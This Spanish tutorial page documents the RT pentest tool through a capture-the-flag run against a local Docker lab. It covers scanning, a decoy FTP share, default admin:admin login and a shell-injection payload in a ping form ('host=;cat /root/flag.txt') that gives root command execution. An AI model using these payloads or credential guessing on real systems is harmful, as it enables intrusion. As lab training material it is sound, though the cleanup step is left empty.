import TerminalFrame from '../../../../components/TerminalFrame.astro';

Este tutorial te guía a través de un engagement completo contra un entorno de laboratorio deliberadamente vulnerable. Usarás RT para gestionar tu reconocimiento, rastrear hipótesis, seguir callejones sin salida y finalmente capturar el flag — el mismo flujo de trabajo que usarías en un objetivo real.

**Tiempo:** ~30 minutos prácticos.

**Prerequisitos:** RT [instalado](/es/getting-started/installation/) y configurado (`rt setup` completado), Docker y Docker Compose disponibles.

## 1. Levantar el laboratorio

El laboratorio simple es un solo contenedor ejecutando tres servicios: HTTP, FTP y SSH. Desde la raíz del proyecto:

<TerminalFrame title="bash">
```
$ cd docs-site/labs/simple
$ docker compose up -d --build
[+] Building 12.3s (9/9) FINISHED
[+] Running 1/1
 ✔ Container simple-target-1  Started
```
</TerminalFrame>

Verifica que el contenedor esté corriendo:

<TerminalFrame title="bash">
```
$ docker compose ps
NAME               STATUS    PORTS
simple-target-1    Up        0.0.0.0:21-22->21-22/tcp, 0.0.0.0:80->80/tcp
```
</TerminalFrame>

Tu objetivo ahora está activo en `localhost`. Los puertos 21 (FTP), 22 (SSH) y 80 (HTTP) están expuestos.

## 2. Inicializar el workspace de RT

Crea un workspace nuevo para este engagement:

<TerminalFrame title="bash">
```
$ mkdir simple-lab && cd simple-lab
$ rt init --target 127.0.0.1 --goal ctf --scope 127.0.0.1/32
[+] Workspace initialized: simple-lab
[+] Target: 127.0.0.1
[+] Goal: ctf
[+] Scope: 127.0.0.1/32
[+] Session: sess_7f3a1b
[+] Database: .rt/redtrail.db
```
</TerminalFrame>

Activa el entorno RT para que los comandos se capturen automáticamente:

<TerminalFrame title="bash">
```
$ eval "$(rt env)"
[rt:simple-lab] $
```
</TerminalFrame>

## 3. Reconocimiento — escanear el objetivo

Comienza con un escaneo de versiones de servicio. RT intercepta la llamada a nmap, captura su salida y extrae hallazgos a la base de conocimiento:

<TerminalFrame title="nmap — 127.0.0.1">
```
[rt:simple-lab] $ nmap -sV -sC 127.0.0.1

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed
|   pub/backup.sql.gz
|   pub/credentials.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Werkzeug/3.0 Python/3.12
|_http-title: NetPanel - Login

[rt] captured → 1 host, 3 ports, 2 service fingerprints
```
</TerminalFrame>

Tres puertos abiertos. FTP anónimo con archivos visibles, SSH y una aplicación web llamada "NetPanel". Veamos qué recopiló RT:

<TerminalFrame title="rt kb">
```
[rt:simple-lab] $ rt kb hosts

[rt:simple-lab] $ rt kb ports --host 127.0.0.1

127.0.0.1  80    tcp    http     Werkzeug/3.0 Py3.12  open
```
</TerminalFrame>

## 4. La pista falsa del FTP

¿FTP anónimo con archivos llamados `backup.sql.gz` y `credentials.txt`? Eso grita "mira aquí primero." Investiguemos — pero rastreemos nuestro razonamiento como hipótesis para tener un registro auditable.

### Formular la hipótesis

<TerminalFrame title="rt hypothesis">
```
[rt:simple-lab] $ rt hypothesis create \
    "FTP anonymous files contain valid credentials for other services" \
    --category auth \
    --priority high \
    --confidence 0.7 \
    --component 127.0.0.1:21
[+] Hypothesis #1 created (status: pending)
```
</TerminalFrame>

**¿Por qué rastrear esto?** Incluso los callejones sin salida son valiosos. Cuando escribas el reporte final, querrás mostrar el proceso de decisión — qué investigaste, qué descartaste y por qué.

### Obtener los archivos FTP

<TerminalFrame title="ftp — 127.0.0.1">
```
[rt:simple-lab] $ ftp -a 127.0.0.1
Connected to 127.0.0.1.
230 Login successful.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
-rw-r--r--  1 ftp ftp  1024 Mar 15 00:00 backup.sql.gz
-rw-r--r--  1 ftp ftp   182 Mar 15 00:00 credentials.txt
ftp> get backup.sql.gz
ftp> get credentials.txt
ftp> bye

[rt] captured → 2 files downloaded via FTP
```
</TerminalFrame>

### Inspeccionar la evidencia

<TerminalFrame title="bash">
```
[rt:simple-lab] $ cat credentials.txt
## Internal credentials - EXPIRED 2024-01-15 ##
## DO NOT USE - accounts have been rotated ##

admin:Summer2023!
dbadmin:Passw0rd123
deploy:d3pl0y_2023_temp
jenkins:j3nk1ns_b00t

[rt:simple-lab] $ file backup.sql.gz
backup.sql.gz: data
```
</TerminalFrame>

El archivo de credenciales dice expiradas. El "backup" es datos basura — no es un archivo gzip válido. Señuelo clásico.

### Registrar la evidencia y refutar

Registra lo encontrado y actualiza la hipótesis:

<TerminalFrame title="rt evidence">
```
[rt:simple-lab] $ rt evidence add \
    --hypothesis 1 \
    --type contra \
    --content "credentials.txt header says EXPIRED 2024-01-15, accounts rotated. backup.sql.gz is junk data (not valid gzip)."
[+] Evidence #1 added to hypothesis #1

[rt:simple-lab] $ rt hypothesis update 1 --status refuted
[+] Hypothesis #1 → refuted
```
</TerminalFrame>

**Conclusión:** El recurso compartido FTP era un callejón sin salida. En un engagement real, documentar los caminos descartados te evita revisitarlos y demuestra exhaustividad en tu reporte.

## 5. Pivotar a la aplicación web

Pidamos orientación a RT ahora que FTP es un callejón sin salida:

<TerminalFrame title="rt ask">
```
[rt:simple-lab] $ rt ask "FTP was a decoy. What should I try next?"
[*] Sending context: 1 host, 3 ports, 1 hypothesis (refuted), 5 commands...

Based on your session:

1. **Investigate the web app on port 80** (highest priority)
   → The NetPanel login page is the most promising attack surface.
   Try default/common credentials: admin:admin, admin:password
   Priority: HIGH

2. **SSH brute force as fallback**
   → Only if web app yields nothing. Check for weak passwords.
   Priority: LOW — try web app first
```
</TerminalFrame>

El LLM tiene contexto completo: sabe que FTP fue refutado y nos dirige a la aplicación web. Sigamos ese consejo.

## 6. Descubrir credenciales web por defecto

Crea una nueva hipótesis para el camino web:

<TerminalFrame title="rt hypothesis">
```
[rt:simple-lab] $ rt hypothesis create \
    "NetPanel web app uses default credentials" \
    --category auth \
    --priority high \
    --confidence 0.5 \
    --component 127.0.0.1:80
[+] Hypothesis #2 created (status: pending)
```
</TerminalFrame>

Prueba la credencial por defecto más común — `admin:admin`:

<TerminalFrame title="curl — 127.0.0.1:80">
```
[rt:simple-lab] $ curl -v -X POST http://127.0.0.1/ \
    -d "username=admin&password=admin" \
    -c cookies.txt -L
< HTTP/1.1 302 FOUND
< Location: /admin
> GET /admin HTTP/1.1
< HTTP/1.1 200 OK
<html>
  <title>NetPanel - Admin</title>
  ...Network Diagnostics...
  ...Host to ping...
</html>

[rt] captured → HTTP 302 redirect to /admin (auth success)
```
</TerminalFrame>

Estamos dentro. Las credenciales por defecto funcionaron. Registra la evidencia:

<TerminalFrame title="rt evidence">
```
[rt:simple-lab] $ rt evidence add \
    --hypothesis 2 \
    --type supporting \
    --content "admin:admin grants access to /admin panel. HTTP 302 redirect confirms auth success."
[+] Evidence #2 added to hypothesis #2

[rt:simple-lab] $ rt hypothesis update 2 --status confirmed
[+] Hypothesis #2 → confirmed
```
</TerminalFrame>

## 7. Encontrar la inyección de comandos

El panel de administración tiene una función de "Network Diagnostics" — un formulario que hace ping a un host. Cada vez que la entrada del usuario alimenta un comando del sistema, vale la pena probar inyección de comandos.

<TerminalFrame title="rt hypothesis">
```
[rt:simple-lab] $ rt hypothesis create \
    "NetPanel ping diagnostic is vulnerable to OS command injection" \
    --category vuln \
    --priority critical \
    --confidence 0.6 \
    --component 127.0.0.1:80/admin
[+] Hypothesis #3 created (status: pending)
```
</TerminalFrame>

Prueba con un separador de comandos simple:

<TerminalFrame title="curl — command injection test">
```
[rt:simple-lab] $ curl -s -X POST http://127.0.0.1/admin \
    -b cookies.txt \
    -d "host=127.0.0.1;id"
...
<div class="output">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.028 ms

uid=0(root) gid=0(root) groups=0(root)
</div>

[rt] captured → HTTP POST to /admin with injection payload
```
</TerminalFrame>

El comando `id` se ejecutó — y la aplicación corre como **root**. Este es un hallazgo crítico.

<TerminalFrame title="rt evidence">
```
[rt:simple-lab] $ rt evidence add \
    --hypothesis 3 \
    --type supporting \
    --content "Injecting ;id after ping input returns uid=0(root). Full RCE as root confirmed."
[+] Evidence #3 added to hypothesis #3

[rt:simple-lab] $ rt hypothesis update 3 --status confirmed
[+] Hypothesis #3 → confirmed
```
</TerminalFrame>

## 8. Capturar el flag

Con ejecución de comandos como root, obtén el flag:

<TerminalFrame title="curl — flag capture">
```
[rt:simple-lab] $ curl -s -X POST http://127.0.0.1/admin \
    -b cookies.txt \
    -d "host=;cat /root/flag.txt"
...
<div class="output">FLAG{r3dtr41l_s1mpl3_l4b_pwn3d}
</div>

[rt] captured → flag extracted via command injection
```
</TerminalFrame>

Registra el flag:

<TerminalFrame title="rt flag">
```
[rt:simple-lab] $ rt flag add "FLAG{r3dtr41l_s1mpl3_l4b_pwn3d}" \
    --source "command injection via /admin ping diagnostic" \
    --host 127.0.0.1
[+] Flag captured: FLAG{r3dtr41l_s1mpl3_l4b_pwn3d}
```
</TerminalFrame>

Limpia cuando termines:

<TerminalFrame title="bash">

## Lo que practicaste

| Habilidad | Función de RT utilizada |
|-----------|------------------------|
| Enumeración de servicios | `nmap` → `rt kb hosts/ports` |
| Pruebas basadas en hipótesis | `rt hypothesis create/update` |
| Documentar callejones sin salida | `rt evidence add --type contra` |
| Pivoteo asistido por LLM | `rt ask` con contexto completo de sesión |
| Prueba de credenciales | `curl` + `rt evidence add --type supporting` |
| Explotación de vulnerabilidades | Inyección de comandos → `rt flag add` |
| Generación de reportes | `rt report generate` |
